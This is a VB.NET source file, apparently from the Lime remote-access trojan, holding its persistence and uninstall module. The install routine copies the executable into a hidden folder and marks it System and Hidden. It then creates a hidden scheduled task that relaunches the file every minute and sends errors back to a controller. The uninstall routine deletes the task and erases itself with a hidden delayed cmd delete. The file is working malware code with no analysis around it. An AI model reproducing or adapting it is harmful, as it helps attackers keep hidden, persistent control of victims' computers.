
Namespace Lime
    Public Class Insistence
        Public Shared C As SK
        Public Shared Sub INS()

            If Settings.DRCHK AndAlso Reflection.Assembly.GetExecutingAssembly.Location <> Settings.fullpath Then

                Try
                    If Not IO.Directory.Exists(Environ(Settings.DRPATH) & "\" & Settings.DRFOLDER) Then
                        IO.Directory.CreateDirectory(Environ(Settings.DRPATH) & "\" & Settings.DRFOLDER)
                    ElseIf IO.File.Exists(Settings.fullpath) Then
                        IO.File.Delete(Settings.fullpath)
                    End If
                    Threading.Thread.Sleep(50)

                    Dim NF As New IO.FileStream((Settings.fullpath), IO.FileMode.CreateNew)
                    Dim LEXEBYTES As Byte() = IO.File.ReadAllBytes(Settings.NEXE.FullName)
                    NF.Write(LEXEBYTES, 0, LEXEBYTES.Length)
                    NF.Flush()
                    NF.Close()
                    Settings.NEXE = New IO.FileInfo(Settings.fullpath)
                    Threading.Thread.Sleep(50)

                    IO.File.SetAttributes(Settings.NEXE.FullName, IO.FileAttributes.System + IO.FileAttributes.Hidden)

                    Shell("schtasks /create /f /sc minute /mo 1 /tn " & Settings.STUPNAME & " /tr " & Settings.NEXE.FullName & "", AppWinStyle.Hide, False, -1)
                    Threading.Thread.Sleep(50)

                    Process.Start(Settings.NEXE.FullName)
                    End
                Catch ex As Exception
                    C.Send("Error" & Settings.SPL & "[Startup Error] " & ex.Message)
                End Try
            End If
        End Sub

        Public Shared Sub DEL()
            Try
                If Settings.DRCHK Then
                    IO.File.SetAttributes(Settings.NEXE.FullName, IO.FileAttributes.Normal)
                    Threading.Thread.Sleep(50)

                    Shell("schtasks /Delete /tn " & Settings.STUPNAME & " /F", AppWinStyle.Hide, False, -1)
                    Threading.Thread.Sleep(50)
                End If

                IO.File.Delete(IO.Path.GetTempPath + "\lime.dat")
                Threading.Thread.Sleep(50)

                Shell("cmd.exe /c ping 0 -n 2 & del """ & Settings.NEXE.FullName & """", AppWinStyle.Hide, False, -1)
                End
            Catch ex As Exception
                C.Send("Error" & Settings.SPL & "[Uninstall Error] " & ex.Message)
            End Try
        End Sub

    End Class
End Namespace